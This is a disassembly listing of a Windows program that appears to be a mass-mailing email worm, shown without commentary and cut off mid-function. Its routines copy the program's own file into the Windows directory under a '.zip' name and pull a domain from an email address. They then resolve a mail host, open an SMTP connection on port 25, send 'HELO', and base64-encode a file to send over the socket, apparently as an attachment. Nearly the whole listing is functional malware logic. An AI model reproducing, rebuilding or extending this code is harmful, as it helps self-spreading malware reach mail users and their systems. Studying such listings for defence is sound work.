.text:00401AC5 var_40	       = dword ptr -40h
.text:00401AC5 var_3C	       = dword ptr -3Ch
.text:00401AC5 var_38	       = dword ptr -38h
.text:00401AC5 var_34	       = dword ptr -34h
.text:00401AC5 var_30	       = dword ptr -30h
.text:00401AC5 var_2C	       = dword ptr -2Ch
.text:00401AC5 var_28	       = dword ptr -28h
.text:00401AC5 var_24	       = dword ptr -24h
.text:00401AC5 var_20	       = dword ptr -20h
.text:00401AC5 var_1C	       = dword ptr -1Ch
.text:00401AC5 var_18	       = dword ptr -18h
.text:00401AC5 var_14	       = dword ptr -14h
.text:00401AC5 SystemTime      = _SYSTEMTIME ptr -10h
.text:00401AC5 arg_0	       = dword ptr  8
.text:00401AC5
.text:00401AC5		       push    ebp
.text:00401AC6		       mov     ebp, esp
.text:00401AC8		       sub     esp, 108h
.text:00401ACE		       lea     eax, [ebp+SystemTime]
.text:00401AD1		       mov     [ebp+var_2C], offset aSun ; "Sun"
.text:00401AD8		       push    eax	       ; lpSystemTime
.text:00401AD9		       mov     [ebp+var_28], offset aMon ; "Mon"
.text:00401AE0		       mov     [ebp+var_24], offset aTue ; "Tue"
.text:00401AE7		       mov     [ebp+var_20], offset aWed ; "Wed"
.text:00401AEE		       mov     [ebp+var_1C], offset aThu ; "Thu"
.text:00401AF5		       mov     [ebp+var_18], offset aFri ; "Fri"
.text:00401AFC		       mov     [ebp+var_14], offset aSat ; "Sat"
.text:00401B03		       mov     [ebp+var_5C], offset aJan ; "Jan"
.text:00401B0A		       mov     [ebp+var_58], offset aFeb ; "Feb"
.text:00401B11		       mov     [ebp+var_54], offset aMar ; "Mar"
.text:00401B18		       mov     [ebp+var_50], offset aApr ; "Apr"
.text:00401B1F		       mov     [ebp+var_4C], offset aMay ; "May"
.text:00401B26		       mov     [ebp+var_48], offset aJun ; "Jun"
.text:00401B2D		       mov     [ebp+var_44], offset aJul ; "Jul"
.text:00401B34		       mov     [ebp+var_40], offset aAug ; "Aug"
.text:00401B3B		       mov     [ebp+var_3C], offset aSep ; "Sep"
.text:00401B42		       mov     [ebp+var_38], offset aOct ; "Oct"
.text:00401B49		       mov     [ebp+var_34], offset aNov ; "Nov"
.text:00401B50		       mov     [ebp+var_30], offset aDec ; "Dec"
.text:00401B57		       call    ds:GetLocalTime
.text:00401B5D		       and     [ebp+TimeZoneInformation.Bias], 0
.text:00401B64		       lea     eax, [ebp+TimeZoneInformation]
.text:00401B6A		       push    eax	       ; lpTimeZoneInformation
.text:00401B6B		       call    ds:GetTimeZoneInformation
.text:00401B71		       mov     ecx, [ebp+TimeZoneInformation.Bias]
.text:00401B77		       cmp     eax, 2
.text:00401B7A		       jnz     short loc_401B81
.text:00401B7C		       mov     eax, [ebp+TimeZoneInformation.DaylightBias]
.text:00401B7F		       add     ecx, eax
.text:00401B81
.text:00401B81 loc_401B81:			       ; CODE XREF: sub_401AC5+B5j
.text:00401B81		       neg     ecx
.text:00401B83		       push    esi
.text:00401B84		       push    edi
.text:00401B85		       mov     esi, ecx
.text:00401B87		       jns     short loc_401B8B
.text:00401B89		       neg     esi
.text:00401B8B
.text:00401B8B loc_401B8B:			       ; CODE XREF: sub_401AC5+C2j
.text:00401B8B		       cmp     [ebp+SystemTime.wDayOfWeek], 6
.text:00401B90		       jbe     short loc_401B98
.text:00401B92		       mov     [ebp+SystemTime.wDayOfWeek], 6
.text:00401B98
.text:00401B98 loc_401B98:			       ; CODE XREF: sub_401AC5+CBj
.text:00401B98		       cmp     [ebp+SystemTime.wMonth],	0
.text:00401B9D		       jnz     short loc_401BA5
.text:00401B9F		       mov     [ebp+SystemTime.wMonth],	1
.text:00401BA5
.text:00401BA5 loc_401BA5:			       ; CODE XREF: sub_401AC5+D8j
.text:00401BA5		       cmp     [ebp+SystemTime.wMonth],	0Ch
.text:00401BAA		       jbe     short loc_401BB2
.text:00401BAC		       mov     [ebp+SystemTime.wMonth],	0Ch
.text:00401BB2
.text:00401BB2 loc_401BB2:			       ; CODE XREF: sub_401AC5+E5j
.text:00401BB2		       test    ecx, ecx
.text:00401BB4		       mov     ecx, offset asc_407A68 ;	"+"
.text:00401BB9		       jge     short loc_401BC0
.text:00401BBB		       mov     ecx, offset asc_407A64 ;	"-"
.text:00401BC0
.text:00401BC0 loc_401BC0:			       ; CODE XREF: sub_401AC5+F4j
.text:00401BC0		       mov     eax, esi
.text:00401BC2		       push    3Ch
.text:00401BC4		       cdq
.text:00401BC5		       pop     edi
.text:00401BC6		       idiv    edi
.text:00401BC8		       mov     eax, esi
.text:00401BCA		       push    edx
.text:00401BCB		       push    edi
.text:00401BCC		       cdq
.text:00401BCD		       pop     esi
.text:00401BCE		       idiv    esi
.text:00401BD0		       push    eax
.text:00401BD1		       push    ecx
.text:00401BD2		       movzx   eax, [ebp+SystemTime.wSecond]
.text:00401BD6		       push    eax
.text:00401BD7		       movzx   eax, [ebp+SystemTime.wMinute]
.text:00401BDB		       push    eax
.text:00401BDC		       movzx   eax, [ebp+SystemTime.wHour]
.text:00401BE0		       push    eax
.text:00401BE1		       movzx   eax, [ebp+SystemTime.wYear]
.text:00401BE5		       push    eax
.text:00401BE6		       movzx   eax, [ebp+SystemTime.wMonth]
.text:00401BEA		       push    [ebp+eax*4+TimeZoneInformation.DaylightBias]
.text:00401BEE		       movzx   eax, [ebp+SystemTime.wDay]
.text:00401BF2		       push    eax
.text:00401BF3		       movzx   eax, [ebp+SystemTime.wDayOfWeek]
.text:00401BF7		       push    [ebp+eax*4+var_2C]
.text:00401BFB		       push    offset aSUSU_2u_2u_2uS ;	"%s, %u	%s %u %.2u:%.2u:%.2u %s%.2u%.2u"
.text:00401C00		       push    [ebp+arg_0]     ; LPSTR
.text:00401C03		       call    ds:wsprintfA
.text:00401C09		       add     esp, 30h
.text:00401C0C		       pop     edi
.text:00401C0D		       pop     esi
.text:00401C0E		       leave
.text:00401C0F		       retn
.text:00401C0F sub_401AC5      endp
.text:00401C0F
.text:00401C10
.text:00401C10 ; =============== S U B R O U T I N E =======================================
.text:00401C10
.text:00401C10 ; Attributes: bp-based frame
.text:00401C10
.text:00401C10 ; int __cdecl sub_401C10(HFILE hFile, SOCKET s, int)
.text:00401C10 sub_401C10      proc near	       ; CODE XREF: sub_401D65+9D2p
.text:00401C10
.text:00401C10 buf	       = byte ptr -14h
.text:00401C10 var_10	       = dword ptr -10h
.text:00401C10 var_C	       = dword ptr -0Ch
.text:00401C10 var_8	       = dword ptr -8
.text:00401C10 Buffer	       = byte ptr -4
.text:00401C10 hFile	       = dword ptr  8
.text:00401C10 s	       = dword ptr  0Ch
.text:00401C10 arg_8	       = dword ptr  10h
.text:00401C10
.text:00401C10		       push    ebp
.text:00401C11		       mov     ebp, esp
.text:00401C13		       sub     esp, 14h
.text:00401C16		       and     [ebp+var_8], 0
.text:00401C1A		       push    ebx
.text:00401C1B		       mov     ebx, ds:send
.text:00401C21		       push    esi
.text:00401C22		       push    edi
.text:00401C23
.text:00401C23 loc_401C23:			       ; CODE XREF: sub_401C10+80j
.text:00401C23					       ; sub_401C10+9Cj
.text:00401C23		       xor     edi, edi
.text:00401C25		       mov     [ebp+var_C], edi
.text:00401C28
.text:00401C28 loc_401C28:			       ; CODE XREF: sub_401C10+3Bj
.text:00401C28		       lea     esi, [ebp+edi+Buffer]
.text:00401C2C		       push    1	       ; uBytes
.text:00401C2E		       push    esi	       ; lpBuffer
.text:00401C2F		       push    [ebp+hFile]     ; hFile
.text:00401C32		       call    ds:_lread
.text:00401C38		       test    eax, eax
.text:00401C3A		       mov     [ebp+var_10], eax
.text:00401C3D		       jz      short loc_401C44
.text:00401C3F		       inc     [ebp+var_C]
.text:00401C42		       jmp     short loc_401C47
.text:00401C44 ; ---------------------------------------------------------------------------
.text:00401C44
.text:00401C44 loc_401C44:			       ; CODE XREF: sub_401C10+2Dj
.text:00401C44		       and     byte ptr	[esi], 0
.text:00401C47
.text:00401C47 loc_401C47:			       ; CODE XREF: sub_401C10+32j
.text:00401C47		       inc     edi
.text:00401C48		       cmp     edi, 3
.text:00401C4B		       jl      short loc_401C28
.text:00401C4D		       xor     edi, edi
.text:00401C4F		       cmp     [ebp+var_C], edi
.text:00401C52		       jz      short loc_401C7F
.text:00401C54		       push    [ebp+var_C]
.text:00401C57		       lea     eax, [ebp+buf]
.text:00401C5A		       push    eax
.text:00401C5B		       lea     eax, [ebp+Buffer]
.text:00401C5E		       push    eax
.text:00401C5F		       call    sub_401A52
.text:00401C64		       add     esp, 0Ch
.text:00401C67		       xor     esi, esi
.text:00401C69
.text:00401C69 loc_401C69:			       ; CODE XREF: sub_401C10+6Aj
.text:00401C69		       push    edi	       ; flags
.text:00401C6A		       lea     eax, [ebp+esi+buf]
.text:00401C6E		       push    1	       ; len
.text:00401C70		       push    eax	       ; buf
.text:00401C71		       push    [ebp+s]	       ; s
.text:00401C74		       call    ebx ; send
.text:00401C76		       inc     esi
.text:00401C77		       cmp     esi, 4
.text:00401C7A		       jl      short loc_401C69
.text:00401C7C		       inc     [ebp+var_8]
.text:00401C7F
.text:00401C7F loc_401C7F:			       ; CODE XREF: sub_401C10+42j
.text:00401C7F		       mov     eax, [ebp+arg_8]
.text:00401C82		       push    4
.text:00401C84		       cdq
.text:00401C85		       pop     ecx
.text:00401C86		       idiv    ecx
.text:00401C88		       cmp     [ebp+var_8], eax
.text:00401C8B		       jge     short loc_401C94
.text:00401C8D		       cmp     [ebp+var_10], edi
.text:00401C90		       jnz     short loc_401C23
.text:00401C92		       xor     edi, edi
.text:00401C94
.text:00401C94 loc_401C94:			       ; CODE XREF: sub_401C10+7Bj
.text:00401C94		       cmp     [ebp+var_8], edi
.text:00401C97		       jz      short loc_401CA6
.text:00401C99		       push    edi	       ; flags
.text:00401C9A		       push    2	       ; len
.text:00401C9C		       push    offset buf      ; "\r\n"
.text:00401CA1		       push    [ebp+s]	       ; s
.text:00401CA4		       call    ebx ; send
.text:00401CA6
.text:00401CA6 loc_401CA6:			       ; CODE XREF: sub_401C10+87j
.text:00401CA6		       cmp     [ebp+var_10], edi
.text:00401CA9		       mov     [ebp+var_8], edi
.text:00401CAC		       jnz     loc_401C23
.text:00401CB2		       pop     edi
.text:00401CB3		       pop     esi
.text:00401CB4		       pop     ebx
.text:00401CB5		       leave
.text:00401CB6		       retn
.text:00401CB6 sub_401C10      endp
.text:00401CB6
.text:00401CB7
.text:00401CB7 ; =============== S U B R O U T I N E =======================================
.text:00401CB7
.text:00401CB7
.text:00401CB7 sub_401CB7      proc near	       ; CODE XREF: sub_401CDF:loc_401CE7p
.text:00401CB7					       ; sub_401D19:loc_401D2Cp ...
.text:00401CB7		       mov     eax, dword_414B60
.text:00401CBC		       imul    eax, 343FDh
.text:00401CC2		       add     eax, 269EC3h
.text:00401CC7		       mov     dword_414B60, eax
.text:00401CCC		       shr     eax, 10h
.text:00401CCF		       and     eax, 7FFFh
.text:00401CD4		       retn
.text:00401CD4 sub_401CB7      endp
.text:00401CD4
.text:00401CD5
.text:00401CD5 ; =============== S U B R O U T I N E =======================================
.text:00401CD5
.text:00401CD5
.text:00401CD5 sub_401CD5      proc near	       ; CODE XREF: WinMain(x,x,x,x)+13p
.text:00401CD5
.text:00401CD5 arg_0	       = dword ptr  4
.text:00401CD5
.text:00401CD5		       mov     eax, [esp+arg_0]
.text:00401CD9		       mov     dword_414B60, eax
.text:00401CDE		       retn
.text:00401CDE sub_401CD5      endp
.text:00401CDE
.text:00401CDF
.text:00401CDF ; =============== S U B R O U T I N E =======================================
.text:00401CDF
.text:00401CDF
.text:00401CDF sub_401CDF      proc near	       ; CODE XREF: sub_401D65+7FBp
.text:00401CDF					       ; sub_401D65+863p
.text:00401CDF
.text:00401CDF arg_0	       = dword ptr  4
.text:00401CDF arg_4	       = byte ptr  8
.text:00401CDF
.text:00401CDF		       push    esi
.text:00401CE0		       mov     esi, [esp+4+arg_0]
.text:00401CE4		       push    edi
.text:00401CE5		       xor     edi, edi
.text:00401CE7
.text:00401CE7 loc_401CE7:			       ; CODE XREF: sub_401CDF+22j
.text:00401CE7		       call    sub_401CB7
.text:00401CEC		       push    9
.text:00401CEE		       cdq
.text:00401CEF		       pop     ecx
.text:00401CF0		       idiv    ecx
.text:00401CF2		       mov     eax, off_407188
.text:00401CF7		       mov     al, [edx+eax]
.text:00401CFA		       mov     [edi+esi], al
.text:00401CFD		       inc     edi
.text:00401CFE		       cmp     edi, 10h
.text:00401D01		       jb      short loc_401CE7
.text:00401D03		       mov     al, [esp+8+arg_4]
.text:00401D07		       mov     byte ptr	[esi+4], 2Dh
.text:00401D0B		       mov     byte ptr	[esi+9], 2Dh
.text:00401D0F		       mov     byte ptr	[esi+0Eh], 2Dh
.text:00401D13		       mov     [esi+0Fh], al
.text:00401D16		       pop     edi
.text:00401D17		       pop     esi
.text:00401D18		       retn
.text:00401D18 sub_401CDF      endp
.text:00401D18
.text:00401D19
.text:00401D19 ; =============== S U B R O U T I N E =======================================
.text:00401D19
.text:00401D19
.text:00401D19 ; int __cdecl sub_401D19(char *Str)
.text:00401D19 sub_401D19      proc near	       ; CODE XREF: sub_401D65+5A2p
.text:00401D19
.text:00401D19 Str	       = dword ptr  4
.text:00401D19
.text:00401D19		       push    esi
.text:00401D1A		       push    edi
.text:00401D1B		       mov     edi, [esp+8+Str]
.text:00401D1F		       xor     esi, esi
.text:00401D21		       push    edi	       ; Str
.text:00401D22		       call    _strlen
.text:00401D27		       test    eax, eax
.text:00401D29		       pop     ecx
.text:00401D2A		       jbe     short loc_401D4E
.text:00401D2C
.text:00401D2C loc_401D2C:			       ; CODE XREF: sub_401D19+33j
.text:00401D2C		       call    sub_401CB7
.text:00401D31		       push    9
.text:00401D33		       cdq
.text:00401D34		       pop     ecx
.text:00401D35		       idiv    ecx
.text:00401D37		       mov     eax, off_407188
.text:00401D3C		       push    edi	       ; Str
.text:00401D3D		       mov     al, [edx+eax]
.text:00401D40		       mov     [esi+edi], al
.text:00401D43		       inc     esi
.text:00401D44		       call    _strlen
.text:00401D49		       cmp     esi, eax
.text:00401D4B		       pop     ecx
.text:00401D4C		       jb      short loc_401D2C
.text:00401D4E
.text:00401D4E loc_401D4E:			       ; CODE XREF: sub_401D19+11j
.text:00401D4E		       pop     edi
.text:00401D4F		       pop     esi
.text:00401D50		       retn
.text:00401D50 sub_401D19      endp
.text:00401D50
.text:00401D51
.text:00401D51 ; =============== S U B R O U T I N E =======================================
.text:00401D51
.text:00401D51
.text:00401D51 sub_401D51      proc near	       ; CODE XREF: sub_401D65+299p
.text:00401D51					       ; sub_401D65+31Cp ...
.text:00401D51
.text:00401D51 arg_0	       = dword ptr  4
.text:00401D51
.text:00401D51		       cmp     [esp+arg_0], 0FFFFFFFFh
.text:00401D56		       jz      short loc_401D62
.text:00401D58		       cmp     [esp+arg_0], 0
.text:00401D5D		       jz      short loc_401D62
.text:00401D5F		       mov     al, 1
.text:00401D61		       retn
.text:00401D62 ; ---------------------------------------------------------------------------
.text:00401D62
.text:00401D62 loc_401D62:			       ; CODE XREF: sub_401D51+5j
.text:00401D62					       ; sub_401D51+Cj
.text:00401D62		       xor     al, al
.text:00401D64		       retn
.text:00401D64 sub_401D51      endp
.text:00401D64
.text:00401D65
.text:00401D65 ; =============== S U B R O U T I N E =======================================
.text:00401D65
.text:00401D65 ; Attributes: bp-based frame
.text:00401D65
.text:00401D65 ; int __cdecl sub_401D65(LPCSTR hFile)
.text:00401D65 sub_401D65      proc near	       ; CODE XREF: sub_402905+84p
.text:00401D65					       ; WinMain(x,x,x,x)+DDp
.text:00401D65
.text:00401D65 var_13FC	       = dword ptr -13FCh
.text:00401D65 NumberOfBytesWritten= byte ptr -13ECh
.text:00401D65 Buffer	       = byte ptr -0FECh
.text:00401D65 PathName	       = byte ptr -0BECh
.text:00401D65 var_7ED	       = byte ptr -7EDh
.text:00401D65 hObject	       = byte ptr -7ECh
.text:00401D65 var_3EC	       = byte ptr -3ECh
.text:00401D65 name	       = byte ptr -2ECh
.text:00401D65 var_26C	       = byte ptr -26Ch
.text:00401D65 Source	       = byte ptr -16Ch
.text:00401D65 Dst	       = word ptr -12Ch
.text:00401D65 var_12A	       = word ptr -12Ah
.text:00401D65 var_128	       = byte ptr -128h
.text:00401D65 buf	       = byte ptr -11Ch
.text:00401D65 var_1C	       = dword ptr -1Ch
.text:00401D65 var_18	       = dword ptr -18h
.text:00401D65 var_14	       = dword ptr -14h
.text:00401D65 var_10	       = dword ptr -10h
.text:00401D65 var_C	       = dword ptr -0Ch
.text:00401D65 pOutBufLen      = dword ptr -8
.text:00401D65 var_4	       = dword ptr -4
.text:00401D65 hFile	       = dword ptr  8
.text:00401D65
.text:00401D65		       push    ebp
.text:00401D66		       mov     ebp, esp
.text:00401D68		       mov     eax, 13ECh
.text:00401D6D		       call    __alloca_probe
.text:00401D72		       push    ebx
.text:00401D73		       push    esi
.text:00401D74		       push    edi
.text:00401D75		       call    sub_401CB7
.text:00401D7A		       push    19h
.text:00401D7C		       cdq
.text:00401D7D		       pop     ecx
.text:00401D7E		       idiv    ecx
.text:00401D80		       cmp     edx, 0Bh
.text:00401D83		       mov     esi, off_40718C[edx*4]
.text:00401D8A		       mov     [ebp+var_10], esi
.text:00401D8D		       jle     loc_401EB1
.text:00401D93		       mov     ebx, 400h
.text:00401D98		       lea     eax, [ebp+hObject]
.text:00401D9E		       push    ebx	       ; uSize
.text:00401D9F		       push    eax	       ; lpBuffer
.text:00401DA0		       mov     [ebp+var_C], 1
.text:00401DA7		       call    ds:GetWindowsDirectoryA
.text:00401DAD		       lea     eax, [ebp+hObject]
.text:00401DB3		       push    eax	       ; Str
.text:00401DB4		       call    _strlen
.text:00401DB9		       cmp     [ebp+eax+var_7ED], 5Ch
.text:00401DC1		       pop     ecx
.text:00401DC2		       jz      short loc_401DD7
.text:00401DC4		       lea     eax, [ebp+hObject]
.text:00401DCA		       push    offset Source   ; "\\"
.text:00401DCF		       push    eax	       ; Dest
.text:00401DD0		       call    _strcat
.text:00401DD5		       pop     ecx
.text:00401DD6		       pop     ecx
.text:00401DD7
.text:00401DD7 loc_401DD7:			       ; CODE XREF: sub_401D65+5Dj
.text:00401DD7		       lea     eax, [ebp+Buffer]
.text:00401DDD		       push    esi	       ; Source
.text:00401DDE		       push    eax	       ; Dest
.text:00401DDF		       call    _strcpy
.text:00401DE4		       push    esi	       ; Str
.text:00401DE5		       xor     edi, edi
.text:00401DE7		       call    _strlen
.text:00401DEC		       add     esp, 0Ch
.text:00401DEF		       test    eax, eax
.text:00401DF1		       jbe     short loc_401E1B
.text:00401DF3
.text:00401DF3 loc_401DF3:			       ; CODE XREF: sub_401D65+B4j
.text:00401DF3		       cmp     byte ptr	[edi+esi], 2Eh
.text:00401DF7		       lea     eax, [edi+esi]
.text:00401DFA		       jnz     short loc_401E0F
.text:00401DFC		       and     byte ptr	[eax], 0
.text:00401DFF		       push    offset a_zip    ; ".zip"
.text:00401E04		       push    esi	       ; Dest
.text:00401E05		       call    _strcat
.text:00401E0A		       pop     ecx
.text:00401E0B		       pop     ecx
.text:00401E0C		       push    32h
.text:00401E0E		       pop     edi
.text:00401E0F
.text:00401E0F loc_401E0F:			       ; CODE XREF: sub_401D65+95j
.text:00401E0F		       push    esi	       ; Str
.text:00401E10		       inc     edi
.text:00401E11		       call    _strlen
.text:00401E16		       cmp     edi, eax
.text:00401E18		       pop     ecx
.text:00401E19		       jb      short loc_401DF3
.text:00401E1B
.text:00401E1B loc_401E1B:			       ; CODE XREF: sub_401D65+8Cj
.text:00401E1B		       lea     eax, [ebp+hObject]
.text:00401E21		       push    esi	       ; Source
.text:00401E22		       push    eax	       ; Dest
.text:00401E23		       call    _strcat
.text:00401E28		       pop     ecx
.text:00401E29		       lea     eax, [ebp+NumberOfBytesWritten]
.text:00401E2F		       pop     ecx
.text:00401E30		       push    ebx	       ; nSize
.text:00401E31		       push    eax	       ; lpFilename
.text:00401E32		       push    0	       ; hModule
.text:00401E34		       call    ds:GetModuleFileNameA
.text:00401E3A		       lea     eax, [ebp+Buffer]
.text:00401E40		       push    eax	       ; lpBuffer
.text:00401E41		       lea     eax, [ebp+hObject]
.text:00401E47		       push    eax	       ; hObject
.text:00401E48		       lea     eax, [ebp+NumberOfBytesWritten]
.text:00401E4E		       push    eax	       ; NumberOfBytesWritten
.text:00401E4F		       call    sub_40170B
.text:00401E54		       add     esp, 0Ch
.text:00401E57
.text:00401E57 loc_401E57:			       ; CODE XREF: sub_401D65+150j
.text:00401E57		       mov     eax, off_407178
.text:00401E5C		       mov     [ebp+var_18], eax
.text:00401E5F		       call    sub_401CB7
.text:00401E64		       push    6
.text:00401E66		       mov     ebx, [ebp+hFile]
.text:00401E69		       cdq
.text:00401E6A		       pop     ecx
.text:00401E6B		       mov     esi, ds:lstrlenA
.text:00401E71		       idiv    ecx
.text:00401E73		       and     [ebp+Source], 0
.text:00401E7A		       push    ebx	       ; lpString
.text:00401E7B		       mov     byte_407CA4, 22h
.text:00401E82		       xor     edi, edi
.text:00401E84		       mov     eax, edx
.text:00401E86		       shl     eax, 2
.text:00401E89		       mov     ecx, off_407160[eax]
.text:00401E8F		       mov     eax, off_407148[eax]
.text:00401E95		       mov     [ebp+var_1C], ecx
.text:00401E98		       mov     [ebp+var_14], eax
.text:00401E9B		       call    esi ; lstrlenA
.text:00401E9D		       test    eax, eax
.text:00401E9F		       jle     short loc_401EC9
.text:00401EA1
.text:00401EA1 loc_401EA1:			       ; CODE XREF: sub_401D65+148j
.text:00401EA1		       cmp     byte ptr	[edi+ebx], 40h
.text:00401EA5		       jz      short loc_401EB7
.text:00401EA7		       push    ebx	       ; lpString
.text:00401EA8		       inc     edi
.text:00401EA9		       call    esi ; lstrlenA
.text:00401EAB		       cmp     edi, eax
.text:00401EAD		       jl      short loc_401EA1
.text:00401EAF		       jmp     short loc_401EC9
.text:00401EB1 ; ---------------------------------------------------------------------------
.text:00401EB1
.text:00401EB1 loc_401EB1:			       ; CODE XREF: sub_401D65+28j
.text:00401EB1		       and     [ebp+var_C], 0
.text:00401EB5		       jmp     short loc_401E57
.text:00401EB7 ; ---------------------------------------------------------------------------
.text:00401EB7
.text:00401EB7 loc_401EB7:			       ; CODE XREF: sub_401D65+140j
.text:00401EB7		       lea     eax, [edi+ebx+1]
.text:00401EBB		       push    eax	       ; lpString2
.text:00401EBC		       lea     eax, [ebp+Source]
.text:00401EC2		       push    eax	       ; lpString1
.text:00401EC3		       call    ds:lstrcpyA
.text:00401EC9
.text:00401EC9 loc_401EC9:			       ; CODE XREF: sub_401D65+13Aj
.text:00401EC9					       ; sub_401D65+14Aj
.text:00401EC9		       cmp     [ebp+Source], 0
.text:00401ED0		       jz      loc_402836
.text:00401ED6		       mov     esi, ds:GlobalAlloc
.text:00401EDC		       mov     edi, 248h
.text:00401EE1		       push    edi	       ; dwBytes
.text:00401EE2		       push    40h	       ; uFlags
.text:00401EE4		       call    esi ; GlobalAlloc
.text:00401EE6		       mov     ebx, eax
.text:00401EE8		       lea     eax, [ebp+pOutBufLen]
.text:00401EEB		       push    eax	       ; pOutBufLen
.text:00401EEC		       push    ebx	       ; pFixedInfo
.text:00401EED		       mov     [ebp+pOutBufLen], edi
.text:00401EF0		       call    GetNetworkParams
.text:00401EF5		       mov     edi, ds:GlobalFree
.text:00401EFB		       cmp     eax, 6Fh
.text:00401EFE		       jnz     short loc_401F0C
.text:00401F00		       push    ebx	       ; hMem
.text:00401F01		       call    edi ; GlobalFree
.text:00401F03		       push    [ebp+pOutBufLen]	; dwBytes
.text:00401F06		       push    40h	       ; uFlags
.text:00401F08		       call    esi ; GlobalAlloc
.text:00401F0A		       mov     ebx, eax
.text:00401F0C
.text:00401F0C loc_401F0C:			       ; CODE XREF: sub_401D65+199j
.text:00401F0C		       lea     eax, [ebp+pOutBufLen]
.text:00401F0F		       push    eax	       ; pOutBufLen
.text:00401F10		       push    ebx	       ; pFixedInfo
.text:00401F11		       call    GetNetworkParams
.text:00401F16		       test    eax, eax
.text:00401F18		       jnz     short loc_401F2D
.text:00401F1A		       lea     eax, [ebx+110h]
.text:00401F20		       push    eax	       ; Source
.text:00401F21		       push    offset Dest     ; Dest
.text:00401F26		       call    _strcpy
.text:00401F2B		       pop     ecx
.text:00401F2C		       pop     ecx
.text:00401F2D
.text:00401F2D loc_401F2D:			       ; CODE XREF: sub_401D65+1B3j
.text:00401F2D		       test    ebx, ebx
.text:00401F2F		       jz      short loc_401F34
.text:00401F31		       push    ebx	       ; hMem
.text:00401F32		       call    edi ; GlobalFree
.text:00401F34
.text:00401F34 loc_401F34:			       ; CODE XREF: sub_401D65+1CAj
.text:00401F34		       lea     eax, [ebp+Source]
.text:00401F3A		       push    eax
.text:00401F3B		       call    sub_401569
.text:00401F40		       mov     esi, eax
.text:00401F42		       pop     ecx
.text:00401F43		       test    esi, esi
.text:00401F45		       jz      loc_402836
.text:00401F4B		       lea     eax, [esi+4]
.text:00401F4E		       push    eax	       ; lpString2
.text:00401F4F		       lea     eax, [ebp+name]
.text:00401F55		       push    eax	       ; lpString1
.text:00401F56		       call    ds:lstrcpyA
.text:00401F5C		       push    esi	       ; Memory
.text:00401F5D		       call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00401F62		       pop     ecx
.text:00401F63		       lea     eax, [ebp+name]
.text:00401F69		       push    eax	       ; name
.text:00401F6A		       call    ds:gethostbyname
.text:00401F70		       mov     esi, eax
.text:00401F72		       test    esi, esi
.text:00401F74		       jz      loc_402836
.text:00401F7A		       push    10h	       ; Size
.text:00401F7C		       lea     eax, [ebp+Dst]
.text:00401F82		       push    0	       ; Val
.text:00401F84		       push    eax	       ; Dst
.text:00401F85		       call    _memset
.text:00401F8A		       mov     eax, [esi+0Ch]
.text:00401F8D		       push    4	       ; Size
.text:00401F8F		       push    dword ptr [eax] ; Src
.text:00401F91		       lea     eax, [ebp+var_128]
.text:00401F97		       push    eax	       ; Dst
.text:00401F98		       call    _memcpy
.text:00401F9D		       add     esp, 18h
.text:00401FA0		       mov     [ebp+Dst], 2
.text:00401FA9		       push    19h	       ; hostshort
.text:00401FAB		       call    ds:htons
.text:00401FB1		       push    6	       ; protocol
.text:00401FB3		       push    1
.text:00401FB5		       pop     esi
.text:00401FB6		       mov     [ebp+var_12A], ax
.text:00401FBD		       push    esi	       ; type
.text:00401FBE		       push    2	       ; af
.text:00401FC0		       call    ds:socket
.text:00401FC6		       mov     edi, eax
.text:00401FC8		       lea     eax, [ebp+Dst]
.text:00401FCE		       push    10h	       ; namelen
.text:00401FD0		       push    eax	       ; name
.text:00401FD1		       push    edi	       ; s
.text:00401FD2		       call    ds:connect
.text:00401FD8		       cmp     eax, 0FFFFFFFFh
.text:00401FDB		       jnz     short loc_401FE1
.text:00401FDD		       xor     esi, esi
.text:00401FDF		       jmp     short loc_402012
.text:00401FE1 ; ---------------------------------------------------------------------------
.text:00401FE1
.text:00401FE1 loc_401FE1:			       ; CODE XREF: sub_401D65+276j
.text:00401FE1		       push    0	       ; flags
.text:00401FE3		       lea     eax, [ebp+buf]
.text:00401FE9		       push    100h	       ; len
.text:00401FEE		       push    eax	       ; buf
.text:00401FEF		       push    edi	       ; s
.text:00401FF0		       call    ds:recv
.text:00401FF6		       lea     ecx, [ebp+buf]
.text:00401FFC		       push    ecx
.text:00401FFD		       push    eax
.text:00401FFE		       call    sub_401D51
.text:00402003		       pop     ecx
.text:00402004		       test    al, al
.text:00402006		       pop     ecx
.text:00402007		       jnz     short loc_402020
.text:00402009		       push    2	       ; how
.text:0040200B		       push    edi	       ; s
.text:0040200C		       call    ds:shutdown
.text:00402012
.text:00402012 loc_402012:			       ; CODE XREF: sub_401D65+27Aj
.text:00402012		       push    edi	       ; s
.text:00402013		       call    ds:closesocket
.text:00402019		       mov     eax, esi
.text:0040201B		       jmp     loc_402838
.text:00402020 ; ---------------------------------------------------------------------------
.text:00402020
.text:00402020 loc_402020:			       ; CODE XREF: sub_401D65+2A2j
.text:00402020		       lea     eax, [ebp+buf]
.text:00402026		       push    offset aHelo    ; "HELO "
.text:0040202B		       push    eax	       ; Dest
.text:0040202C		       call    _strcpy
.text:00402031		       lea     eax, [ebp+Source]
.text:00402037		       push    eax	       ; Source
.text:00402038		       lea     eax, [ebp+buf]
.text:0040203E		       push    eax	       ; Dest
.text:0040203F		       call    _strcat
.text:00402044		       mov     ebx, offset buf ; "\r\n"
.text:00402049		       lea     eax, [ebp+buf]
.text:0040204F		       push    ebx	       ; Source
.text:00402050		       push    eax	       ; Dest
.text:00402051		       call    _strcat
.text:00402056		       add     esp, 18h
.text:00402059		       lea     eax, [ebp+buf]
.text:0040205F		       push    0	       ; flags
.text:00402061		       push    eax	       ; Str
.text:00402062		       call    _strlen
.text:00402067		       mov     esi, ds:send
.text:0040206D		       pop     ecx
.text:0040206E		       push    eax	       ; len
.text:0040206F		       lea     eax, [ebp+buf]
.text:00402075		       push    eax	       ; buf
.text:00402076		       push    edi	       ; s
.text:00402077		       call    esi ; send
.text:00402079		       lea     ecx, [ebp+buf]
.text:0040207F		       push    ecx
.text:00402080		       push    eax
.text:00402081		       call    sub_401D51
.text:00402086		       pop     ecx
.text:00402087		       test    al, al
.text:00402089		       pop     ecx
.text:0040208A		       jz      loc_402821
.text:00402090		       push    0	       ; flags
.text:00402092		       lea     eax, [ebp+buf]
.text:00402098		       push    100h	       ; len
.text:0040209D		       push    eax	       ; buf
.text:0040209E		       push    edi	       ; s
.text:0040209F		       call    ds:recv
.text:004020A5		       mov     [ebp+var_4], eax
.text:004020A8		       lea     eax, [ebp+buf]
.text:004020AE		       push    1	       ; Count
.text:004020B0		       push    eax	       ; Source
.text:004020B1		       push    offset a2       ; "2"
.text:004020B6		       call    _strncpy
